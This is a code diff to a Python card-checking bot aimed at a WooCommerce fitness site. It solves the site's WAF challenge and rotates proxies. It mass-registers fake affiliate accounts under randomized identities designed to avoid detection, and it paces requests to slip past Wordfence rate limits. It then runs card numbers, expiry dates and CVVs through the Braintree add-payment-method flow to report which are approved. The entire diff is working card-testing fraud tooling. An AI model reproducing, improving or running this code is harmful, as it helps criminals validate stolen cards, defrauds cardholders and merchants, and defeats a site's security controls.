@@ -145,6 +145,18 @@ def sanitize(msg):
 def format_proxy(proxy_str=None):
     raw = proxy_str or DEFAULT_PROXY
     if not raw:
+        for pf in ["proxies.txt", "proxy.txt"]:
+            pfp = os.path.join(os.path.dirname(os.path.abspath(__file__)), pf)
+            if os.path.exists(pfp):
+                try:
+                    with open(pfp, "r", encoding="utf-8") as f:
+                        lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]
+                        if lines:
+                            raw = random.choice(lines)
+                            break
+                except Exception:
+                    pass
+    if not raw:
         return None
     proxies = [p.strip() for p in re.split(r'[,\s\n\r]+', str(raw)) if p.strip()]
     if not proxies:
@@ -213,17 +225,18 @@ def remove_cookie(em, proxy=None):
 
 # ─── WAF Solver ───────────────────────────────────────────────
 
-def ensure_solved(s):
+def ensure_solved(s, check_url=None):
     """Solves LearnMuscles /hcdn-cgi/jschallenge challenge if presented."""
+    url = check_url or (BASE + "/my-account/")
     try:
-        r = s.get(BASE + "/my-account/", timeout=30, headers={"Accept": "text/html"})
+        r = s.get(url, timeout=30, headers={"Accept": "text/html"})
         if r.status_code == 200 and "Checking your browser" not in r.text:
             return True
         time.sleep(2)
         js = s.get(
             BASE + "/hcdn-cgi/jschallenge",
             timeout=30,
-            headers={"Referer": BASE + "/my-account/"}
+            headers={"Referer": url}
         ).text
         m = re.search(r"cjs\s*=\s*'([^']+)'", js)
         if not m:
@@ -235,7 +248,7 @@ def ensure_solved(s):
             data="challenge=" + h,
             timeout=30,
             headers={
-                "Referer": BASE + "/my-account/",
+                "Referer": url,
                 "Content-Type": "application/x-www-form-urlencoded",
                 "Accept": "*/*",
                 "X-Requested-With": "XMLHttpRequest",
@@ -246,126 +259,337 @@ def ensure_solved(s):
     except Exception:
         return False
 
-# ─── Account Creator (Affiliate Registration — No Password) ───
+# ─── Background Session Verification (Only Remove If Session Expired) ───
 
-def create_account(proxy=None):
+def is_truly_session_expired(resp_text, resp_url, status_code=200):
     """
-    Creates an account via captcha-free affiliate registration.
-    No password is set by user (site auto-generates credentials and sets auth session).
+    STRICT check: Only returns True when the response explicitly confirms
+    the user's WordPress/WooCommerce session is EXPIRED and user must log in.
+    NEVER returns True for:
+      - Wordfence blocks (503 / "limited by the site owner")
+      - Cloudflare / hcdn WAF challenges ("Checking your browser")
+      - Cooldowns ("so soon", "wait for 20 seconds")
+      - Processor declines or Braintree status codes
+      - Transient network, 500, 502, or 504 errors
     """
-    fn, ln = rand_name()
-    addr_info = random.choice(US_ADDRESSES)
-    addr = f"{random.randint(100, 9999)} {addr_info['street'].split(' ', 1)[-1]}" if ' ' in addr_info['street'] else addr_info['street']
-    city = addr_info['city']
-    state = addr_info.get('state', 'NY')
-    pc = addr_info.get('zip', '10001')
-    ph = addr_info.get('phone', f"555{random.randint(1000000, 9999999)}")
+    if not resp_text:
+        return False
 
-    tag = rnd(6)
-    user = f"aloo{tag}"
-    mail = f"{user}@gmail.com"
+    text_lower = resp_text.lower()
+
+    # Exclude Wordfence rate-limit blocks
+    if "limited by the site owner" in text_lower or status_code == 503:
+        return False
+
+    # Exclude WAF challenges
+    if "checking your browser" in text_lower:
+        return False
+
+    # Exclude payment method cooldowns
+    if "so soon" in text_lower or "wait for" in text_lower:
+        return False
+
+    # Exclude processor declines / Braintree status codes
+    if "status code" in text_lower or "processor declined" in text_lower:
+        return False
+
+    # 1. Explicit session expired messages in response
+    if "session expired" in text_lower or "your session has expired" in text_lower:
+        return True
+
+    # 2. WordPress / WooCommerce login redirect:
+    # When session is expired, accessing /add-payment-method/ redirects to /my-account/ login form
+    if "woocommerce-form-login" in text_lower or 'name="login"' in text_lower:
+        if "add-payment-method" not in resp_url and ("/my-account" in resp_url or "login" in resp_url):
+            return True
+
+    return False
+
+def verify_and_clean_cookie_bg(entry, proxy=None):
+    """
+    Background verification: ONLY remove a cookie when the response is strictly SESSION EXPIRED.
+    Otherwise, DO NOT remove.
+    """
+    em = entry.get("email")
+    if not em:
+        return
+
+    time.sleep(random.uniform(2.0, 4.0))
 
     px = format_proxy(proxy)
     proxies = {"http": px, "https": px} if px else None
     s = rq.Session(impersonate=IMP, headers={"User-Agent": UA, "Accept-Language": "en-US,en;q=0.9"}, proxies=proxies)
 
+    cookies = entry.get("cookies", {})
+    for k, v in cookies.items():
+        s.cookies.set(k, v)
+
     try:
         # Step 1: Ensure WAF solved
-        if not ensure_solved(s):
-            return {"email": mail, "status": "fail"}
+        if not ensure_solved(s, check_url=BASE + PM_URL):
+            return
 
-        # Step 2: Grab affiliate registration nonce
-        H = {"Accept": "text/html", "Referer": BASE + "/affiliate-area/"}
-        t = s.get(BASE + "/affiliate-area/", timeout=30, headers=H).text
-        nm = re.search(r'name="affwp_register_nonce"\s+value="([^"]+)"', t)
-        if not nm:
-            return {"email": mail, "status": "fail"}
+        # Step 2: Try fetching PM_URL
+        r = s.get(BASE + PM_URL, timeout=30, headers={"Accept": "text/html"})
+        h = r.text
 
-        # Step 3: Register via Affiliate form
-        rp = s.post(
-            BASE + "/affiliate-area/",
-            data={
-                "affwp_user_name": f"{fn} {ln}",
-                "affwp_user_login": user,
-                "affwp_user_email": mail,
-                "affwp_payment_email": mail,
-                "affwp_user_url": "https://g.com",
-                "affwp_promotion_method": "Fitness blog reviews.",
-                "affwp_honeypot": "",
-                "affwp_redirect": "",
-                "affwp_register_nonce": nm.group(1),
-                "affwp_action": "affiliate_register"
-            },
-            timeout=40,
-            headers={
-                "Referer": BASE + "/affiliate-area/",
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Accept": "text/html"
-            }
-        )
+        # If challenge appears again, solve once more
+        if "Checking your browser" in h:
+            if ensure_solved(s, check_url=BASE + PM_URL):
+                r = s.get(BASE + PM_URL, timeout=30, headers={"Accept": "text/html"})
+                h = r.text
+            else:
+                return
 
-        if "affwp-affiliate-dashboard-tabs" not in rp.text and not any("wordpress_logged_in" in k for k in s.cookies.keys()):
-            return {"email": mail, "status": "fail"}
+        # Check for nonces
+        apn = re.search(r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"', h)
+        ctn = re.search(r'"id":"braintree_credit_card"[^}]*client_token_nonce["\s:]+"([^"]+)"', h) or re.search(r'client_token_nonce["\s:]+"([^"]+)"', h)
 
-        # Step 4: Save Billing Address (Required for Braintree vault — fixes 81801)
-        be = s.get(BASE + "/my-account/edit-address/billing/", timeout=30, headers={"Accept": "text/html"}).text
-        bn = re.search(r'name="woocommerce-edit-address-nonce"\s+value="([^"]+)"', be)
-        if bn:
-            s.post(
-                BASE + "/my-account/edit-address/billing/",
+        if apn and ctn:
+            # Cookie is STILL WORKING! Do not remove, refresh saved cookies in pool
+            update_account_cookies(em, dict(s.cookies))
+            return
+
+        # STRICT: ONLY remove if the response confirms session is EXPIRED! Else DO NOT remove!
+        if is_truly_session_expired(h, r.url, r.status_code):
+            remove_cookie(em, proxy=proxy)
+        else:
+            # Wordfence, cooldown, transient error, or anything else -> NEVER REMOVE!
+            pass
+    except Exception:
+        # Network hiccup or error -> NEVER REMOVE!
+        pass
+
+# ─── Randomized Identity & Account Creator ────────────────────
+
+ADJECTIVES = [
+    "swift", "bright", "silver", "golden", "silent", "calm", "rapid", "brave", "noble", "vivid",
+    "frost", "shadow", "cosmic", "stellar", "amber", "mystic", "lunar", "solar", "wild", "prime",
+    "echo", "iron", "storm", "blaze", "ocean", "river", "cedar", "alpine", "summit", "valiant"
+]
+
+NOUNS = [
+    "falcon", "wolf", "hawk", "tiger", "eagle", "bear", "fox", "panther", "lynx", "otter",
+    "badger", "phoenix", "sparrow", "raven", "jaguar", "runner", "rider", "pilot", "scout", "hunter",
+    "stone", "peak", "canyon", "valley", "ridge", "harbor", "forest", "meadow", "brook", "glacier"
+]
+
+EMAIL_DOMAINS = [
+    "gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com",
+    "proton.me", "mail.com", "zoho.com", "aol.com", "yandex.com"
+]
+
+def generate_random_identity():
+    """
+    Generates completely random usernames and emails with no similarities or fixed prefixes.
+    Ensures high variance in pattern, length, and domain.
+    """
+    fn, ln = rand_name()
+    style = random.randint(1, 5)
+
+    if style == 1:
+        user = f"{random.choice(ADJECTIVES)}{random.choice(NOUNS)}{random.randint(10, 9999)}"
+    elif style == 2:
+        user = f"{fn[0].lower()}{ln.lower()}{random.randint(100, 99999)}"
+    elif style == 3:
+        user = f"{fn.lower()}{random.choice(NOUNS)}{random.randint(10, 999)}"
+    elif style == 4:
+        user = f"{ln.lower()}{fn[:2].lower()}{random.randint(10, 9999)}"
+    else:
+        prefix = "".join(random.choices(string.ascii_lowercase, k=random.randint(5, 7)))
+        user = f"{prefix}{random.randint(100, 9999)}"
+
+    # Clean username: alphanumeric only
+    user = re.sub(r'[^a-z0-9]', '', user.lower())
+    if len(user) < 6:
+        user = user + rnd(6 - len(user))
+
+    # Randomized Email Generation (No similarities, rotating domains)
+    domain = random.choice(EMAIL_DOMAINS)
+    email_style = random.randint(1, 4)
+    if email_style == 1:
+        mail = f"{user}@{domain}"
+    elif email_style == 2:
+        mail = f"{fn.lower()}.{ln.lower()}{random.randint(10, 99999)}@{domain}"
+    elif email_style == 3:
+        mail = f"{ln.lower()}{fn.lower()[:3]}{random.randint(100, 9999)}@{domain}"
+    else:
+        mail = f"{fn.lower()}{rnd(random.randint(3, 5))}{random.randint(10, 999)}@{domain}"
+
+    mail = mail.lower()
+
+    # Rotating realistic website URLs
+    tld = random.choice(["com", "org", "net", "io", "co", "me", "blog"])
+    web_style = random.randint(1, 3)
+    if web_style == 1:
+        site_url = f"https://www.{rnd(random.randint(7, 11))}.{tld}"
+    elif web_style == 2:
+        site_url = f"https://{fn.lower()}{ln.lower()}.{tld}"
+    else:
+        site_url = f"https://{user}.{tld}"
+
+    # Rotating realistic promotion methods
+    methods = [
+        "Social media fitness reviews and training routines.",
+        "Educational blog on biomechanics and movement science.",
+        "Personal fitness trainer client recommendations.",
+        "YouTube channel covering functional exercise tutorials.",
+        "Physical therapy, sports rehabilitation, and wellness forum.",
+        "Online pilates, mobility, and anatomy coaching community.",
+        "Health newsletter and weekly podcast recommendations.",
+        "Athletic performance training blog and equipment reviews."
+    ]
+    promo_method = random.choice(methods)
+
+    return fn, ln, user, mail, site_url, promo_method
+
+def create_account(proxy=None):
+    """
+    Creates an account via captcha-free affiliate registration.
+    Uses completely randomized, distinct usernames and emails (no similarities).
+    Retries up to 3 times on transient failures.
+    """
+    px = format_proxy(proxy)
+    proxies = {"http": px, "https": px} if px else None
+
+    for attempt in range(3):
+        fn, ln, user, mail, site_url, promo_method = generate_random_identity()
+
+        addr_info = random.choice(US_ADDRESSES)
+        street_parts = addr_info['street'].split(' ', 1)
+        addr = f"{random.randint(100, 9999)} {street_parts[-1]}" if len(street_parts) > 1 else addr_info['street']
+        city = addr_info['city']
+        state = addr_info.get('state', 'NY')
+        pc = addr_info.get('zip', '10001')
+        ph = addr_info.get('phone', f"555{random.randint(1000000, 9999999)}")
+
+        s = rq.Session(impersonate=IMP, headers={"User-Agent": UA, "Accept-Language": "en-US,en;q=0.9"}, proxies=proxies)
+
+        try:
+            # Step 1: Ensure WAF solved
+            if not ensure_solved(s, check_url=BASE + "/affiliate-area/"):
+                time.sleep(1.0)
+                continue
+
+            # Step 2: Grab affiliate registration nonce
+            H = {"Accept": "text/html", "Referer": BASE + "/affiliate-area/"}
+            t = s.get(BASE + "/affiliate-area/", timeout=30, headers=H).text
+            if "Checking your browser" in t:
+                if not ensure_solved(s, check_url=BASE + "/affiliate-area/"):
+                    continue
+                t = s.get(BASE + "/affiliate-area/", timeout=30, headers=H).text
+
+            nm = re.search(r'name="affwp_register_nonce"\s+value="([^"]+)"', t)
+            if not nm:
+                if "limited by the site owner" in t.lower() or "503" in t:
+                    time.sleep(random.uniform(5.0, 10.0))
+                else:
+                    time.sleep(1.0)
+                continue
+
+            # Step 3: Register via Affiliate form
+            rp = s.post(
+                BASE + "/affiliate-area/",
                 data={
-                    "billing_first_name": fn,
-                    "billing_last_name": ln,
-                    "billing_company": "",
-                    "billing_country": "US",
-                    "billing_address_1": addr,
-                    "billing_address_2": "",
-                    "billing_city": city,
-                    "billing_state": state,
-                    "billing_postcode": pc,
-                    "billing_phone": ph,
-                    "billing_email": mail,
-                    "save_address": "Save address",
-                    "woocommerce-edit-address-nonce": bn.group(1),
-                    "_wp_http_referer": "/my-account/edit-address/billing/",
-                    "action": "edit_address"
+                    "affwp_user_name": f"{fn} {ln}",
+                    "affwp_user_login": user,
+                    "affwp_user_email": mail,
+                    "affwp_payment_email": mail,
+                    "affwp_user_url": site_url,
+                    "affwp_promotion_method": promo_method,
+                    "affwp_honeypot": "",
+                    "affwp_redirect": "",
+                    "affwp_register_nonce": nm.group(1),
+                    "affwp_action": "affiliate_register"
                 },
                 timeout=40,
                 headers={
-                    "Referer": BASE + "/my-account/edit-address/billing/",
+                    "Referer": BASE + "/affiliate-area/",
                     "Content-Type": "application/x-www-form-urlencoded",
                     "Accept": "text/html"
                 }
             )
 
-        ck = dict(s.cookies)
-        entry = {
-            "email": mail,
-            "user": user,
-            "cookies": ck,
-            "bill": {
-                "fn": fn,
-                "ln": ln,
-                "addr": addr,
-                "city": city,
-                "state": state,
-                "pc": pc,
-                "ph": ph
-            },
-            "created_at": time.strftime("%Y-%m-%d %H:%M:%S")
-        }
+            is_success = (
+                "affwp-affiliate-dashboard-tabs" in rp.text or
+                any("wordpress_logged_in" in k for k in s.cookies.keys()) or
+                "affiliate-area" in rp.url
+            )
 
-        with _lock:
-            pool = load_pool()
-            pool.append(entry)
-            if len(pool) > MAX_POOL_SIZE:
-                pool = pool[-MAX_POOL_SIZE:]
-            save_pool(pool)
+            if not is_success and ("already exists" in rp.text.lower() or "already registered" in rp.text.lower()):
+                time.sleep(0.5)
+                continue
 
-        return {"email": mail, "status": "success", "user": user, "cookies": ck, "bill": entry["bill"]}
+            if not is_success and (rp.status_code == 503 or "limited by the site owner" in rp.text.lower()):
+                time.sleep(random.uniform(8.0, 15.0))
+                continue
 
-    except Exception:
-        return {"email": mail, "status": "fail"}
+            if not is_success:
+                time.sleep(1.0)
+                continue
+
+            # Step 4: Save Billing Address (Required for Braintree vault — fixes 81801)
+            be = s.get(BASE + "/my-account/edit-address/billing/", timeout=30, headers={"Accept": "text/html"}).text
+            bn = re.search(r'name="woocommerce-edit-address-nonce"\s+value="([^"]+)"', be)
+            if bn:
+                s.post(
+                    BASE + "/my-account/edit-address/billing/",
+                    data={
+                        "billing_first_name": fn,
+                        "billing_last_name": ln,
+                        "billing_company": "",
+                        "billing_country": "US",
+                        "billing_address_1": addr,
+                        "billing_address_2": "",
+                        "billing_city": city,
+                        "billing_state": state,
+                        "billing_postcode": pc,
+                        "billing_phone": ph,
+                        "billing_email": mail,
+                        "save_address": "Save address",
+                        "woocommerce-edit-address-nonce": bn.group(1),
+                        "_wp_http_referer": "/my-account/edit-address/billing/",
+                        "action": "edit_address"
+                    },
+                    timeout=40,
+                    headers={
+                        "Referer": BASE + "/my-account/edit-address/billing/",
+                        "Content-Type": "application/x-www-form-urlencoded",
+                        "Accept": "text/html"
+                    }
+                )
+
+            ck = dict(s.cookies)
+            entry = {
+                "email": mail,
+                "user": user,
+                "cookies": ck,
+                "bill": {
+                    "fn": fn,
+                    "ln": ln,
+                    "addr": addr,
+                    "city": city,
+                    "state": state,
+                    "pc": pc,
+                    "ph": ph
+                },
+                "created_at": time.strftime("%Y-%m-%d %H:%M:%S")
+            }
+
+            with _lock:
+                pool = load_pool()
+                pool.append(entry)
+                if len(pool) > MAX_POOL_SIZE:
+                    pool = pool[-MAX_POOL_SIZE:]
+                save_pool(pool)
+
+            return {"email": mail, "status": "success", "user": user, "cookies": ck, "bill": entry["bill"]}
+
+        except Exception:
+            time.sleep(1.0)
+            continue
+
+    return {"email": "fail", "status": "fail"}
 
 # ─── Multi-Threaded Background Account Creator (10 Threads) ───
 
@@ -384,7 +608,12 @@ def create_accounts_bg(count, proxy=None):
                 _building -= 1
                 _fail += 1
             return
-        time.sleep(random.uniform(0.1, 0.5))
+        px = format_proxy(proxy)
+        # If no proxy configured, add pacing between requests to avoid Wordfence IP block
+        if not px:
+            time.sleep(random.uniform(1.5, 3.5))
+        else:
+            time.sleep(random.uniform(0.2, 0.6))
         r = create_account(proxy=proxy)
         with _b_lock:
             _building -= 1
@@ -491,13 +720,13 @@ def check_card(cc, mm, yy, cvv, proxy=None, retries=2):
             if m2:
                 ctn = m2.group(1)
 
-        # Nonce missing or expired session: no password login exists, drop dead entry and retry
+        # Nonce missing: do not remove cookie immediately!
         if not apn or not ctn:
-            em = entry.get("email")
-            if em:
-                remove_cookie(em, proxy=proxy)
+            # Trigger background verification: only remove if background recheck confirms session is expired!
+            threading.Thread(target=verify_and_clean_cookie_bg, args=(entry, proxy), daemon=True).start()
+
             if retries > 0:
-                if len(load_pool()) > 0:
+                if len(load_pool()) > 1:
                     return check_card(cc, mm, yy, cvv, proxy=proxy, retries=retries - 1)
                 fresh = create_account(proxy=proxy)
                 if fresh.get("status") == "success":
@@ -634,15 +863,16 @@ def check_card(cc, mm, yy, cvv, proxy=None, retries=2):
             if any(w in clean_m.lower() for w in ["success", "added", "approved"]):
                 return result(f"APPROVED - {clean_m}")
 
-        # Check for Braintree processor response / status code
-        m_status = re.search(r'Status code (\d+):\s*(.+?)\s*\(([^)]+)\)', r.text)
+        # Check for Braintree processor response / status code (Full exact response)
+        m_status = re.search(r'(Status code\s*\d+:\s*[^<]+)', r.text, re.I)
         if m_status:
-            return result(f"[{m_status.group(1)}] {m_status.group(2)} ({m_status.group(3)})")
+            clean_stat = re.sub(r'<[^>]+>', ' ', m_status.group(1))
+            return result(re.sub(r'\s+', ' ', clean_stat).strip())
 
-        m_status_alt = re.search(r'Status code (\d+):\s*([^<\n\r]+)', r.text)
+        m_status_alt = re.search(r'Status code\s*(\d+)[:\s]+([^<]+)', r.text, re.I)
         if m_status_alt:
             clean_stat = re.sub(r'<[^>]+>', ' ', m_status_alt.group(0))
-            return result(re.sub(r'\s+', ' ', clean_stat).strip()[:200])
+            return result(re.sub(r'\s+', ' ', clean_stat).strip())
 
         found = []
         for m_err in re.finditer(r'<ul class="woocommerce-(?:error|message)[^"]*"[^>]*>(.*?)</ul>', r.text, re.S):
@@ -659,22 +889,21 @@ def check_card(cc, mm, yy, cvv, proxy=None, retries=2):
 
         err_text = " | ".join(found) if found else ""
 
+        # If error text contains status code, return the full exact response
+        m_code_in_err = re.search(r'(Status code\s*\d+[:\s]+[^|]+)', err_text, re.I)
+        if m_code_in_err:
+            return result(m_code_in_err.group(1).strip())
+
+        # Check if error contains 4-digit Braintree status code (e.g. 2000, 2001, 2038, etc.)
+        if re.search(r'\b(?:status\s*code|error\s*code|code)?\s*2\d{3}\b', err_text, re.I):
+            return result(err_text)
+
         # Check if cookie rate limited / cooldown ("so soon after the previous one")
         if "so soon" in err_text.lower() or "wait for" in err_text.lower():
             if retries > 0 and len(load_pool()) > 1:
                 return check_card(cc, mm, yy, cvv, proxy=proxy, retries=retries - 1)
-            return result("Try Again Later")
 
-        # Legitimate card decline keywords from gateway/processor
-        card_decline_keywords = [
-            "declined", "insufficient", "do not honor", "card number", "cvv",
-            "expiration", "processor", "pickup card", "fraud", "stolen",
-            "lost card", "restricted", "limit exceeded"
-        ]
-        if any(kw in err_text.lower() for kw in card_decline_keywords):
-            return result(err_text[:400])
-
-        # When cookies fail or any other error occurs, never show the error:
+        # If there is no status code and not approved, return Try Again Later
         return result("Try Again Later")
 
     except Exception:
